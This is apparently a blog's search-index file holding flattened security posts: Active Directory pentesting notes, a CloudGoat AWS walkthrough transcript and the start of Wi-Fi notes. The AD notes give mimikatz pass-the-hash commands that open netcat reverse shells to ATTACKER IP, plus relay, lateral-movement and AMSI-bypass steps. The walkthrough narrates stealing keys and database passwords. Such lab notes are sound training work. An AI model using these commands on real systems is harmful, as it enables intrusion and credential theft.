nopowershell - script block logging can be bypassed https gist githubusercontent com cobbr d8072d730b24fbae6ffe3aed8ca9c407 raw fa6dcb69b1f563788af9f3a11a7b07bae34fa8ec ScriptBlockLogBypass ps1 for the current session without admin privileges - logged under event 4104 if caught by AMSI remember to obfuscate Other Best Practices - NEVER run services as a Domain Admin - avoid using unconstrained delegation and constrained delegation - do not allow DAs to log into machines other than the DCs - if it is necessary to log into other machines limit the machine to only allow administrator logins from DAs - this makes credential theft unlikely - never run a service as a DA - if needed to provide temporary permissions to some entity or vendor use the following command Add-ADGroupMember -Identity GROUP NAME -Members new user example -MemberTimeToLive New-TimeSpan -Minutes OF MINUTES - set Account is sensitive and cannot be delegated for sensitive accounts - found within the Account tab in the user s properties - if running legacy software that cannot be updated ensure the app is restricted to certain users or groups - run agent on application and use Azure Application Proxy https learn microsoft com en-us azure active-directory app-proxy application-proxy which will block access from everyone until they input their AD credentials - add sensitive users to the Protected Users Group Protected Users Group - Protected Users Group ensures the following - CredSSP and WDigest to stop cleartext credential caching and NTLM hash is not cached - no NTLM authentication - no delegation - TGT cannot be renewed beyond four hours this is hardcoded and is unconfigurable - test the potential impact of an account lockout for DA and EAs before adding to this group - computer and service accounts would not benefit from this group because their credentials will still be present on the host machine Tools 1 BloodHound https github com BloodHoundAD BloodHound - useful for enumeration in penetration tests finding exploitation pathways 2 PowerSploit https github com PowerShellMafia PowerSploit - PowerView and PowerUp - useful for enumeration and finding exploiting privesc pathways 3 ADModule https github com samratashok ADModule - enumeration - signed by Microsoft 4 PowerUpSQL https github com NetSPI PowerUpSQL - toolkit for attacking SQL servers 5 PowerShdll https github com p3nt4 PowerShdll nopowershell https github com bitsadmin nopowershell and Invisi-Shell https github com OmerYa Invisi-Shell - useful for bypassing some PowerShell defenses and staying stealthy 6 NetLoader https github com Flangvik NetLoader - used for loading executables from memory while bypassing EDR solutions 7 SpoolSample https github com leechristensen SpoolSample - contains binary MS-RPRN exe used for abusing print spooler bug 8 Certify https github com GhostPack Certify - AD CS exploitation References 1 Nikhil Mittal s CRTP course main source - https www alteredsecurity com adlab https www alteredsecurity com adlab 2 https isc sans edu diary Pillaging Passwords from Service Accounts 24886 text First of all 2C credentials for the registry in clear-text https isc sans edu diary Pillaging Passwords from Service Accounts 24886 text First 20of 20all 2C 20credentials 20for the 20registry 20in 20clear 2Dtext - service account credentials 3 https blog netwrix com 2022 11 03 cracking ad password with as rep roasting https blog netwrix com 2022 11 03 cracking ad password with as rep roasting - AS-REP roasting 4 https harmj0y medium com a-guide-to-attacking-domain-trusts-ef5f8992bb9d https harmj0y medium com a-guide-to-attacking-domain-trusts-ef5f8992bb9d - attacking domain trusts 5 https learn microsoft com en-us windows-server identity ad-ds manage understand-security-identifiers https learn microsoft com en-us windows-server identity ad-ds manage understand-security-identifiers - list of well-known SIDs 6 https www paloaltonetworks com blog security-operations stopping-powershell-without-powershell https www paloaltonetworks com blog security-operations stopping-powershell-without-powershell - using LOLBINs to bypass PowerShell defenses 7 https improsec com tech-blog one-thousand-and-one-application-blocks https improsec com tech-blog one-thousand-and-one-application-blocks - WDAC vs AppLocker ",
				"image": "/images/CRTP.png"
		},
    {
      "title"    : "Active Directory Pentesting Notes",
      "category" : "",
      "tags"     : "Active Directory, AD, Notes",
      "url"      : "/2023/02/28/Active-Directory-Pentesting-Notes",
      "date"     : "Feb 28, 2023",
      "content"  : " Active Directory Pentesting Contact LinkedIn https www linkedin com in segev-eliezer https www linkedin com in segev-eliezer YouTube https YouTube com 0xd4y https YouTube com 0xd4y Website https 0xd4y com https 0xd4y com GitHub https GitHub com 0xd4y https GitHub com 0xd4y Table of Contents Objects Users - security principals - can be authenticated by domain - assigned privileges over resources People - a person can be a user Service - services can also be users e g IIS or MSSQL - services only have privileges to run their specific service Machines - security principals - machine object created for all computers in AD domain - machine accounts have local admin rights - can be logged into but password are typically rotated every 30 days and contain 120 characters - used by domain controllers to synchronize AD updates and changes - machine account name is the name of the machine followed by dollar sign Security Groups - users assigned to security group will inherit the permissions of the group Default groups https learn microsoft com en-us windows-server identity ad-ds manage understand-security-groups Security Group Description --- --- Domain Admins Admin privileges over entire domain Server Operators - Administer Domain Controllers - Can t change administrative group memberships Backup Operators - Access any file - Backup data on computers Account Operators - Create or modify other accounts in domain Domain Users All users in domain Domain Computers All computers in domain Domain Controllers All Domain Controllers in domain Organization Units OUs - used to help apply policies to users and computers Untitled Active 20Directory 20Pentesting 2013bdf411f877497282c549a5fd16d4c9 Untitled png Group Policy Objects GPOs - used for applying policies to OUs - collection of settings - distributed to network in SYSVOL share - all users have access to SYSVOL to periodically sync their GPOs can take up to 2 hours - syncs can be forced with gpupdate force Untitled Active 20Directory 20Pentesting 2013bdf411f877497282c549a5fd16d4c9 Untitled 201 png - GPOs applied to OU propagate to all sub-OUs works as hierarchy Example GPO Settings Untitled Active 20Directory 20Pentesting 2013bdf411f877497282c549a5fd16d4c9 Untitled 202 png Authentication - credentials are stored in Domain Controller - Domain Controller verifies user authentication Two protocols for authentication 1 Kerberos - Default protocol 2 NetNTLM - Legacy - Obsolete but typically enabled for compatibility with old clients and servers Kerberos Untitled Active 20Directory 20Pentesting 2013bdf411f877497282c549a5fd16d4c9 Untitled 203 png Untitled Active 20Directory 20Pentesting 2013bdf411f877497282c549a5fd16d4c9 Untitled 204 png Untitled Active 20Directory 20Pentesting 2013bdf411f877497282c549a5fd16d4c9 Untitled 205 png - logged in users are assigned tickets - tickets are proof of previous authentication - when authenticating to a service e g share website or database ticket is used sort of like how web uses auth tokens or cookies Kerberos authentication process 1 Username and timestamp encrypted using password and sent to Key Distribution Center KDC - KDC is responsible for creating Kerberos tickets 2 KDC sends back a Ticket Granting Ticket TGT and Session Key - TGT allows user to request additional tickets to access specific services - TGT encrypted with krbtgt password hash to help prevent user from tampering its contents - TGT contain session key expiration date and user s IP address 3 When user attempts to access a service the KDC sends a Ticket Granting Service TGS and Service Session Key - TGS tickets only allow a user to access a specific service - user sends username and timestamp encrypted with their session key and also sends their TGT and Service Principal Name SPN - SPN is service and server name user wants to access - TGS encrypted with key derived from the Service Owner Hash - Service owner is user or machine that manages the service Overpass-the-Hash Pass-the-Key - when a user requests a TGT a timestamp encrypted with key derived from password is used - encrypted uses either DES disabled by default on current Windows versions RC4 AES128 or AES256 - can request KDC for TGT with just having the key and not the user s password Obtaining Kerberos Encryption Keys mimikatz privilege debug mimikatz sekurlsa ekeys Getting Reverse Shell with Encryption Key RC4 mimikatz sekurlsa pth user Administrator domain za tryhackme com rc4 96ea24eff4dff1fbe13818fbf12ea7d8 run c tools nc64 exe -e cmd exe ATTACKER IP 5556 - note that RC4 simply uses the user s NTLM hash AES128 mimikatz sekurlsa pth user Administrator domain za tryhackme com aes128 b65ea8151f13a31d01377f5934bf3883 run c tools nc64 exe -e cmd exe ATTACKER IP 5556 AES256 mimikatz sekurlsa pth user Administrator domain za tryhackme com aes256 b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 run c tools nc64 exe -e cmd exe ATTACKER IP 5556 NetNTLM Untitled Active 20Directory 20Pentesting 2013bdf411f877497282c549a5fd16d4c9 Untitled 206 png - uses challenge-response methodology - can perform Pass-the-Hash PtH attacks Domain Account 1 Client attempts to access service 2 Server responds with a random number challenge 3 Client encrypts challenge with password hash 4 Server forwards response to Domain Controller 5 Domain Controller also encrypts challenge with user s password hash and compares if the output is the same 6 If the output is the same access granted otherwise denied Local Account For local accounts no need to contact Domain Controller as the passwords are stored locally in the Security Account Manager SAM hive LDAP - application verifies user credentials instead of DC - common with third-party applications - GitHub - Jenkins - Printers - VPNs Untitled Active 20Directory 20Pentesting 2013bdf411f877497282c549a5fd16d4c9 Untitled 207 png Enumeration - BloodHound https github com BloodHoundAD BloodHound is great for enumeration - Manual enumeration commands Command Description --- --- net user domain Find all users in a domain net group domain List all groups in domain net group GROUP NAME domain List members of group net accounts domain Enumerate password policy of domain - note that the net command defaults to the WORKGROUP domain if the workstation is not domain-joined - output of net command may be trimmed - PowerShell cmdlets https learn microsoft com en-us powershell module activedirectory view windowsserver2022-ps https learn microsoft com en-us powershell module activedirectory view windowsserver2022-ps Delegation Unconstrained Delegation - original insecure method of delegation replaced by constrained delegation in 2003 - can force user to authenticate to malicious host to intercept the TGT and therefore impersonate the user Constrained Delegation - introduced in 2003 - restricts service account to services they are allowed to access Resource-Based Constrained Delegation - introduced in 2012 - access to a resource is specified on the resource itself rather than the service account - the service specifies who can delegate to it Privilege Escalation Lateral Movement - lateral movement typically done via WinRM RDP VNC or SSH - to stay stealthy avoid strange connections from one workstation to another e g accessing code repository as a user who is part of the Marketing OU Service - create service on other workstation with a malicious binary and start the service bash sc exe TARGET create malicious service binPath path to reverse shell exe start auto sc exe TARGET start malicious service Windows Management Implementation WMI - session can be established either through DCOM ports 135 and 49152-65535 or Wsman port 5985 or 5986 - outputs of commands are not seen by user when executing Storing session powershell Opt New-CimSessionOption -Protocol DCOM Session New-Cimsession -ComputerName TARGET -Credential credential -SessionOption Opt -ErrorAction Stop All the following methodologies require Administrator privileges Service Methodology Creating Service Remotely with WMI powershell Invoke-CimMethod -CimSession Session -ClassName Win32 Service -MethodName Create -Arguments Name THMService2 DisplayName THMService2 PathName net user munra2 Pass123 add Your payload ServiceType byte Parse 16 Win32OwnProcess Start service in a new process StartMode Manual Get Handle on Service and Starting It powershell Service Get-CimInstance -CimSession Session -ClassName Win32 Service -filter Name LIKE THMService2 Invoke-CimMethod -InputObject Service -MethodName StartService Scheduled Task Methodology powershell Payload must be split in Command and Args Command cmd exe Args c net user 0xd4y PleaseSubscribe add Action New-ScheduledTaskAction -CimSession Session -Execute Command -Argument Args Register-ScheduledTask -CimSession Session -Action Action -User NT AUTHORITY SYSTEM -TaskName MyTask Start-ScheduledTask -CimSession Session -TaskName MyTask Installing MSI Package Methodology After copying MSI file to targeted remote system run the following command to install the package powershell Invoke-CimMethod -CimSession Session -ClassName Win32 Product -MethodName Install -Arguments PackageLocation C Windows myinstaller msi Options AllUsers false RDP Hijacking - SYSTEM user on Windows Server 2016 does not require a password but Windows Server 2019 does - when user connects via RDP and closes their client but not log out their session is still active - use query user to find sessions on machine - unused active sessions identified by Disc state - connect to session using tscon SESSION ID dest SESSIONNAME Untitled Active 20Directory 20Pentesting 2013bdf411f877497282c549a5fd16d4c9 Untitled 208 png Remote Port Forwarding 1 Create a user on attack box without console access useradd tunneluser -m -d home tunneluser -s bin true passwd tunneluser 1 Forward RDP port or whatever port it may be to attack box powershell ssh tunneluser ATTACKER IP -R 3389 RDP MACHINE 3389 -N Common Misconfigurations Access Control Entry ACE - element in an access control list ACL - ACEs is a permission granted to control or monitor access to an object - can often be misconfigured and grant too much access Common ACEs ACE Description --- --- ForceChangePassword Set user s password without needing current password AddMembers Add user to group including own user GenericAll Complete control over object including changing password GenericWrite Update parameters of object could for example be used to change the scriptPath parameter of an object to execute a malicious script WriteOwner Change owner of target object WriteDACL Write new ACEs to target object s DACL Discretionary Access Control List - used to specify who can access a resource AllExtendedRights Perform any action with extended rights on target object Printer Bug - bug called a feature by Microsoft that allows domain user to force a target to authenticate to arbitrary host Can be exploited under the following conditions 1 Have access to valid AD credentials 2 Have network connectivity to target SMB service 3 Target host has Print Spooler service running - check if service is running GWMI Win32 Printer -Computer TARGET HOST - can also use Get-PrinterPort -ComputerName TARGET HOST 4 Target host has SMB signing not enforced - check if SMB signing is enforced nmap --script smb2-security-mode -p445 TARGET HOST - use SpoolSample https github com leechristensen SpoolSample to exploit this bug Detection - PowerShell typically monitored more than CMD AMSI - checks signatures - looks for weak strings such as AmsiScanBuffer amsiInitFailed AmsiUtils etc Obfuscation String Concatenation - concatenation of strings literals and strings constants occurs at compile-time and not run-time - concatenation occurs at run-time for string variables Concatenate Reorder Whitespace --- --- --- 0x d4 y 1 0 -f d4y 0x 0x d4 y Windows Security Features User Account Control UAC Access control that helps prevent malware from damaging a PC by running applications and tasks as a non-administrator account unless specified to run as admin - enabled by default but can be disabled Two types of admins 1 Local account part of local Administrators group not including built-in Administrator account - administrative tasks cannot be performed on a remote machine unless using RDP 2 Domain account part of local Administrators group - administrative tasks can be performed remotely even if not connecting through RDP AppLocker - specifies programs that are allowed to run on computer based off of policies located in secpol msc - restricts access to sections of device or multiple devices in domain Following error is received when AppLocker blocks a program from running This program is blocked by group policy For more information contact your system administrator Example rule Untitled Active 20Directory 20Pentesting 2013bdf411f877497282c549a5fd16d4c9 Untitled 209 png Bypass - abuse misconfigured policies - perform PowerShell downgrade - https github com api0cradle UltimateAppLockerByPassList blob master Generic-AppLockerbypasses md https github com api0cradle UltimateAppLockerByPassList blob master Generic-AppLockerbypasses md Misc Change User Password Set-ADAccountPassword -Identity USER -Server DOMAIN -OldPassword ConvertTo-SecureString -AsPlaintext OLD PASSWORD -force -NewPassword ConvertTo-SecureString -AsPlainText NEW PASSWORD -Force Hostname vs IP dir HOSTNAME SHARE vs dir DC IP Share - authenticating with hostname is done using Kerberos while authenticating with IP is done with NTLM - keep in mind as SOC may be monitoring Overpass-The-Hash used in attacks against Kerberos and or Pass-The-Hash used in attacks against NTLM Create Credential Block powershell username Administrator password Mypass123 securePassword ConvertTo-SecureString password -AsPlainText -Force credential New-Object System Management Automation PSCredential username securePassword SMB Shares Untitled Active 20Directory 20Pentesting 2013bdf411f877497282c549a5fd16d4c9 Untitled 2010 png - note that files within ADMIN are in C Windows and C is in C Signing - signing is often enabled but not enforced as some legacy systems do not support SMB signing - when hosting an SMB server ensure that the server does not support SMB signing Impacket NTLM Relay powershell python3 opt impacket examples ntlmrelayx py -smb2support -t smb TARGET IP -debug - note that you should specify the IP instead of hostname - specifying hostname could cause server to use Kerberos authentication instead of NTLM Tools Recon https github com BloodHoundAD BloodHound https github com BloodHoundAD BloodHound - maps out environment for privesc vectors https github com PowerShellMafia PowerSploit tree master Recon https github com PowerShellMafia PowerSploit tree master Recon Exploitation https github com leechristensen SpoolSample https github com leechristensen SpoolSample - Used for exploiting printer bug for authentication relaying AMSI Bypassing https github com rasta-mouse ThreatCheck https github com rasta-mouse ThreatCheck https github com matterpreter DefenderCheck https github com matterpreter DefenderCheck - outputs bytes attached to signatures of file - useful for helping break signatures for AV evasion References TryHackMe Resources https tryhackme com room breachingad https tryhackme com room breachingad https tryhackme com room winadbasics https tryhackme com room winadbasics https tryhackme com room adenumeration https tryhackme com room adenumeration https tryhackme com room lateralmovementandpivoting https tryhackme com room lateralmovementandpivoting Misc Resources https media licdn com dms document C4E1FAQHJHVVqztQj7Q feedshare-document-pdf-analyzed 0 1672038819682 e 1672876800 v beta t AqTRIRJD1vWHJNHKBVOlnn1 F6unpVcmMwJVDs LM0Y https media licdn com dms document C4E1FAQHJHVVqztQj7Q feedshare-document-pdf-analyzed 0 1672038819682 e 1672876800 v beta t AqTRIRJD1vWHJNHKBVOlnn1 F6unpVcmMwJVDs LM0Y",
				"image": "/images/active_directory_pentesting_notes.jpg"
		},
    {
      "title"    : "Hacking in the Cloud - Cloudgoat: rce_web_app",
      "category" : "Videos",
      "tags"     : "Cloudgoat, Walkthrough, EC2, RDS, AWS",
      "url"      : "/2023/02/04/RCE-Web-App",
      "date"     : "Feb 04, 2023",
      "content"  : "hello everybody this is zero day and this is the rce web app scenario in the cloud goat series unlike with other scenarios this scenario starts off with two users because there s two different ways to escalate your privileges within the environment with one user you can simply query an S3 bucket that contains a private SSH key and you can just use that SSH key to SSH into an ec2 instance and that ec2 instance contains a high privileged role that once you get the credentials for you can then query a different S3 bucket to obtain the credentials for an RDS instance then you just log into that RDS instance and you can get the secret values that are stored within the instance the other user has the permission to query an S3 bucket that contains logs for an elastic load balancer and this log contains a URL that you would otherwise not be able to find so you just are able to query that that from discovering it within the logs and then you get rce onto the ec2 instance and from that stage onwards everything is the same so let s jump right into it we were provided with two users this time Lara and McDuck so let s put their credentials in the AWS credentials file with AWS configure profile Lara and we could put in the axis key and secret key so let s put an access key secret key and same thing with McDuck McDuck access key secret key and a thing I like starting out with uh with this AWS c-line tool is just making sure that I first set my engagement with AWS C lion dash dash set Dash engagement and then name it let s name it rce web app and what this will do is that any command that I run any AWS API call gets recorded in this directory so let s uh just do AWS STS get Dash caller Dash identity now this is an API call that I like running when stealthiness is not a problem so let s do profile Lara just to make sure that we put the correct access key in secret key that we copied it correctly and we did for Lara and McDuck everything looks good so now we can just continue our pen test so let s start off with McDuck uh let s just run a couple of commands so he is an IAM user let s then do maybe a list of roles see if he can do something like that as McDuck not allowed to do that uh can we list the policies can t so let s try ec2 describe instances profile McDuck and specify the region of us-east-1 and we can do that so we have an ec2 instance here uh with let s see this iPad address and we see um this is the key pair and what else anything else of interest there is the security group here so we can assume that SSH is open and HTTP as well so let s just test that out really quick let s try SSH this IP address and we see that it is open it only allows Keys which is very common with ec2 instances um now let s try the http and curl is not returning anything and that s because the security group probably does not allow our IP address to query this uh HTTP application so let s move on with some other services uh how about Lambda list functions profile McDuck and region of us-east-1 and that does not work uh how about S3 profile McDuck and that does uh so there s hundreds of services that AWS offers and just manually inputting that is not only Annoying It s very very tedious so there is a tool called enumerate IAM and what this will do is that just a brute force your potent potential API calls that you can run if it doesn t return an axis denied exception if it does not return this axis denied exception then it is assumed that you can run that command so when we run this we need the access key and the secret key solet s put the access key of McDuck and his secret key Dash the secret key and put that in and let s also specify that we are only interested in us East one and that will just continue brute forcing so while that does its magic we will look at these S3 buckets and see what we can look at so S3 let s do this key store so we see that there we have what looks like it s probably a private key an SSH private key and its Associated public key so we could potentially use this to SSH into this ec2 instance but before doing that let s look at the other S3 buckets so we also have this Cloud goat logs bucket see if we can enumerate that we cannot and how about this Cloud goat secret bucket and we can t do that so let s just take that the the private key from this S3 bucket and let s copy it and put it in our current directory so we have now downloaded this file so let s now SSH into that ec2 instance so SSH I Cloud go and let s assume that it s a nubuntu instance and put in our our IP address for that ec2 instance which was right here SSH and change mod to this file and now let s try again and it was an Ubuntu instance and now we re in uh I mean if you did an nmap scan you could also know that it s Ubuntu if Ubuntu didn t work then you could also do ec2- user which is also very common but anyways now that we are in this instance uh we can curl our iPad I mean our metadata with curl169 254 get the latest endpoint and then uh get the role that s attached to this instance so we see that there s this IAM endpoint which only exists if a role is attached to this instance so we have IAM and security Dash credentials and finally we will have this role here ec2 role rce web app so we can take this and then we get the access key secret key and token for this role and we can take this and put it in our own profile and we can take this and just do AWS configure dash dash profile ec2 and this wouldn t be a problem because we re not worried about stealthiness but because we already have access to this instance we might as well just run API calls from within this instance and also considering that there are some security groups involved in this entire environment maybe this ec2 instance can query a certain IP address but my home IP address cannot due to security groups so we will just stick with this ec2 instance and let s see does it have AWS so let s let s install it install and while this runs let s look at the output of our enumerate IAM tool so we see that we can describe uh instances for RDS so let s just do that really quick while the AWS installs so AWS RDS describe DB instances for a profile of McDuck and region of us-east-1 and we see that there is one um we don t know the credentials but we do know the username is CG admin and the it s using postgres um so this does have a security group and it s possible that it s that using our home IP address we re not allowed to connect to this RDS instance but we can connect to it through our ec2 instance and that s very common as well when you re running an application within an ec2 instance that you wouldn t want just anybody to access an RDS instance you would only want your ec2 instance to use it because that s the only thing that needs to use it so we see that that might be the case here and we can verify that later once this is done installing so it didn t in fact the finish so let s do AWS RDS describe db- instances to see if it can do that it likely does have RDS permissions so AWS artists described as DB instances region of us-east-1 and it can uh it s the same instance so we if you recall there was this S3 bucket that we were not able to enumerate called Cloud goat logs and Cloud go secret so let s see if we can do that with this instance so s3ls and I m used to it in putting a profile but we don t need to do that now so these were the buckets so let s do the bucket that we couldn t query so Cloud goat logs and we see that we can do that here and how about Cloud go Secret Cloud go secret and we can we have db txt so let s check what that is so copy which we re just downloading it copy slash db txt into our current directory so now let s cut this and we see that we have credentials in plain text we have this username of CG admin which if you remember from our RDS output that is the same username here and we have the password of purple pony 2029 so let s connect to this uh postgres RDS instance so P SQL Dash H let s put in our address in 5432 by the way is the default Port so we don t need to specify that Dash H and let s put the username of CG admin and the DB name Cloud go Dash D Cloud go and it is taking a while and that is probably because of the security groups in place so let s copy this same command and do it within the ec2 instance and we see that we can so let s put in the password of purplepony 2029 and we are now inside of the RDS instance so let s do slash DT to list the tables and we see sensitive information this is a table of cloud code admin so let s select everything from the sensitive information table and we see that the super secret password is Victory and all of these characters so that was the pathway for McDuck on how to compromise at least the RDS instance which was the goal for this scenario so now let s switch over to Lara so as the Lara user let s see if we can also list the buckets so AWS s3ls profile Lara and we can do that as well uh so we could do the key store we can enumerate that as the McDuck user uh we can enumerate secret as the ec2 profile but not as McDuck so let s see if we can just jump and do that as the Lara user AWS is 3ls and axis denied as expected uh so let s check out these logs let s see if we can do that accidentally executed the same command but as you can see with sea lion this API call did not get recorded by cloudtrail because this was run straight from memory AWS client recognizes when you run a command that was already ran and so it only reads the output from memory without passing the API call to the AWS account that you re targeting so anyways let s uh just continue with enumerating this S3 bucket and we see that we can do that so let s copy these Cloud go load balancer logs so there is a load balancer within this environment so let s just copy the logs here so dash dash recursive copy it all in the current directory and we downloaded the files we see we have these load balancer logs AWS logs and there is this elastic load balancer access log test file nothing interesting we see there s probably an application involved it s an application load balancer most likely um so let s go into elastic load balancing there was another file right here and let s check this out so we have um it querying where the get requests to this site um a bunch of those here so let s curl this and see what happens curl this cannot resolve host so let s list the elastic load balancers within this environment so we could do that with AWS elb V2 that s just the newer version if we look at the difference between version 2 and the regular version is that if we do AWS elb help we see that it can it supports three types of load balancers application Network and classic while elbv2 supports application Network Gateway and classic so it s just a newer version we might we may as well use it so AWS elb V2 and we want to describe the load balancers in our environment again if you re ever unsure on which commands you can run within a certain service you could just do the service name and then do help and you will see all the different commands that you can run within that service so let s describe the load balancers here with the profile of Lara and the region of us-east-1 and we see that we can do that we have this DNS name it is in fact an application load balancer um and seems that is about it so let s just go to this DNS name and I ll go to Brave paste that in and we see gold star executive Interstellar travel rewards welcome fellow Travelers uh please visit the secret URL which is included in the instructions in the welcome letter you received so we do have access to the logs so let s see if a secret agent did in fact query the secret URL so we can find that here where is where are the logs less 555 so if we look at all the get requests here um we have fave icons this is just the logo of the site we do have this very strange a secret looking URL so let s copy this paste it in um it says the site cannot be reached if we paste that HTML part to the end of this let s see MK copy and we paste it at the end here and we see that we are in fact redirected to the secret URL this secret page please follow the instructions in the welcome letter you received by post and do not enter any other commands run your personalized login command below so who am I let s run that run signup command and we see that we are root if we do LS this is all the contents in this current directory I m actually curious what file is before we try getting a shell on here catfile txt okay so just an IP address so then let s try getting a shell on this system and so there are many different ways you could try getting a reverse Shell through NG Rock um you can try we did see that there s SSH so we can just try putting an SSH file with in the Ubuntu user so if we look at slash home slash Ubuntu we see that there is an SSH directory so LS slash home Ubuntu dot SSH and there s this authorized Keys file so let s create our own SSH file and then save our public key within this authorized Keys file so let s go here ssh- Keygen and the reason I m going to use ed25519 is because this is a very small private key in public key and this will allow us to Echo the output of our public key to this authorized Keys file otherwise you may run into some truncation issues so let s do this let s call it ID RSA and we see this is our private key uh quite small and even smaller is our public key and this end part we can just leave out so let s just Echo this into the authorized Keys file so Echo Echo this into slash home Ubuntu SSH authorized underscore keys and it looks fine so now let s SSH using this file as Ubuntu at and what was the let s go into our AWC line director to see what was the IP address of that ec2 instance so if you do find dot grep IP address or was it or grep Dash rip address I mean um it was this this AWS C line tool just saves all your commands so you can just go into Lara you see that she did elb V2 S3 and STS and you look at McDuck and you see IAM RDS you could just go into any one of these directories and see the txt file anyways uh let s put this ec2 instance in here and we are now inside of the ec2 instance and basically the way to go from here to the RDS instance is the same same thing you get the credentials from the db txt file everything is just the same from here on so anyways thank you for watching and I ll see you in the next video",
				"image": "/images/rce_web_app.png"
		},
    {
      "title"    : "Wi-Fi Pentesting Notes",
      "category" : "",
      "tags"     : "Wi-Fi, Notes",
      "url"      : "/2023/01/19/Wi-Fi-Pentesting-Notes/",
      "date"     : "Jan 19, 2023",
      "content"  : "--- layout post title Wi-Fi Pentesting Notes description Notes I wrote while watching Wi-Fi pentesting videos by Vivek Ramachandran from Pentester Academy date 2023-01-19 image images wifi jpg tags Wi-Fi SQLi Notes --- html head meta http-equiv Content-Type content text html charset utf-8 title Wi-Fi Pentesting Notes title style table of contents-item display block font-size 0 875rem line-height 1 3 padding 0 125rem table of contents-indent-1 margin-left 1 5rem table of contents-indent-2 margin-left 3rem table of contents-indent-3 margin-left 4 5rem table of contents-link text-decoration none opacity 0 7 border-bottom 1px solid rgba 55 53 47 0 18 table th td border 1px solid rgba 55 53 47 0 09 border-collapse collapse table border-left none border-right none th td font-weight normal padding 0 25em 0 5em line-height 1 5 min-height 1 5em text-align left th color rgba 55 53 47 0 6 ol ul margin 0 margin-block-start 0 6em margin-block-end 0 6em li ol first-child li ul first-child margin-block-start 0 6em ul li list-style disc ul to-do-list text-indent -1 7em ul to-do-list li list-style none to-do-children-checked text-decoration line-through opacity 0 375 ul toggle li list-style none ul padding-inline-start 1 7em ul li padding-left 0 1em ol padding-inline-start 1 6em ol li padding-left 0 2em mono ol padding-inline-start 2em mono ol li text-indent -0 4em toggle padding-inline-start 0em list-style-type none Indent toggle children toggle li details padding-left 1 7em toggle li details summary margin-left -1 1em selected-value display inline-block padding 0 0 5em background rgba 206 205 202 0 5 border-radius 3px margin-right 0 5em margin-top 0 3em margin-bottom 0 3em white-space nowrap collection-title display inline-block margin-right 1em simple-table margin-top 1em font-size 0 875rem empty-cells show simple-table td height 29px min-width 120px simple-table th height 29px min-width 120px simple-table-header-color background rgb 247 246 243 color black simple-table-header font-weight 500 time opacity 0 5 icon display inline-block max-width 1 2em max-height 1 2em text-decoration none vertical-align text-bottom margin-right 0 5em img icon border-radius 3px user-icon width 1 5em height 1 5em border-radius 100 margin-right 0 5rem user-icon-inner font-size 0 8em text-icon border 1px solid 000 text-align center page-cover-image display block object-fit cover width 100 max-height 30vh page-header-icon font-size 3rem margin-bottom 1rem page-header-icon-with-cover margin-top -0 72em margin-left 0 07em page-header-icon img border-radius 3px link-to-page margin 1em 0 padding 0 border none font-weight 500 p user opacity 0 5 td user td time white-space nowrap input type checkbox transform scale 1 5 margin-right 0 6em vertical-align middle p margin-top 0 5em margin-bottom 0 5em image border none margin 1 5em 0 padding 0 border-radius 0 text-align center code code background rgba 135 131 120 0 15 border-radius 3px padding 0 2em 0 4em border-radius 3px font-size 85 tab-size 2 code color eb5757 code padding 1 5em 1em code-wrap white-space pre-wrap word-break break-all code code background none padding 0 font-size 100 color inherit blockquote font-size 1 25em margin 1em 0 padding-left 1em border-left 3px solid rgb 55 53 47 bookmark text-decoration none max-height 8em padding 0 display flex width 100 align-items stretch bookmark-title font-size 0 85em overflow hidden text-overflow ellipsis height 1 75em white-space nowrap bookmark-text display flex flex-direction column bookmark-info flex 4 1 180px padding 12px 14px 14px display flex flex-direction column justify-content space-between bookmark-image width 33 flex 1 1 180px display block position relative object-fit cover border-radius 1px bookmark-description color rgba 55 53 47 0 6 font-size 0 75em overflow hidden max-height 4 5em word-break break-word bookmark-href font-size 0 75em margin-top 0 25em sans font-family ui-sans-serif -apple-system BlinkMacSystemFont Segoe UI Helvetica Apple Color Emoji Arial sans-serif Segoe UI Emoji Segoe UI Symbol code font-family SFMono-Regular Menlo Consolas PT Mono Liberation Mono Courier monospace serif font-family Lyon-Text Georgia ui-serif serif mono font-family iawriter-mono Nitti Menlo Courier monospace pdf sans font-family Inter ui-sans-serif -apple-system BlinkMacSystemFont Segoe UI Helvetica Apple Color Emoji Arial sans-serif Segoe UI Emoji Segoe UI Symbol Twemoji Noto Color Emoji Noto Sans CJK JP pdf lang zh-CN sans font-family Inter ui-sans-serif -apple-system BlinkMacSystemFont Segoe UI Helvetica Apple Color Emoji Arial sans-serif Segoe UI Emoji Segoe UI Symbol Twemoji Noto Color Emoji Noto Sans CJK SC pdf lang zh-TW sans font-family Inter ui-sans-serif -apple-system BlinkMacSystemFont Segoe UI Helvetica Apple Color Emoji Arial sans-serif Segoe UI Emoji Segoe UI Symbol Twemoji Noto Color Emoji Noto Sans CJK TC pdf lang ko-KR sans font-family Inter ui-sans-serif -apple-system BlinkMacSystemFont Segoe UI Helvetica Apple Color Emoji Arial sans-serif Segoe UI Emoji Segoe UI Symbol Twemoji Noto Color Emoji Noto Sans CJK KR pdf code font-family Source Code Pro SFMono-Regular Menlo Consolas PT Mono Liberation Mono Courier monospace Twemoji Noto Color Emoji Noto Sans Mono CJK JP pdf lang zh-CN code font-family Source Code Pro SFMono-Regular Menlo Consolas PT Mono Liberation Mono Courier monospace Twemoji Noto Color Emoji Noto Sans Mono CJK SC pdf lang zh-TW code font-family Source Code Pro SFMono-Regular Menlo Consolas PT Mono Liberation Mono Courier monospace Twemoji Noto Color Emoji Noto Sans Mono CJK TC pdf lang ko-KR code font-family Source Code Pro SFMono-Regular Menlo Consolas PT Mono Liberation Mono Courier monospace Twemoji Noto Color Emoji Noto Sans Mono CJK KR pdf serif font-family PT Serif Lyon-Text Georgia ui-serif serif Twemoji Noto Color Emoji Noto Serif CJK JP pdf lang zh-CN serif font-family PT Serif Lyon-Text Georgia ui-serif serif Twemoji Noto Color Emoji Noto Serif CJK SC pdf lang zh-TW serif font-family PT Serif Lyon-Text Georgia ui-serif serif Twemoji Noto Color Emoji Noto Serif CJK TC pdf lang ko-KR serif font-family PT Serif Lyon-Text Georgia ui-serif serif Twemoji Noto Color Emoji Noto Serif CJK KR pdf mono font-family PT Mono iawriter-mono Nitti Menlo Courier monospace Twemoji Noto Color Emoji Noto Sans Mono CJK JP pdf lang zh-CN mono font-family PT Mono iawriter-mono Nitti Menlo Courier monospace Twemoji Noto Color Emoji Noto Sans Mono CJK SC pdf lang zh-TW mono font-family PT Mono iawriter-mono Nitti Menlo Courier monospace Twemoji Noto Color Emoji Noto Sans Mono CJK TC pdf lang ko-KR mono font-family PT Mono iawriter-mono 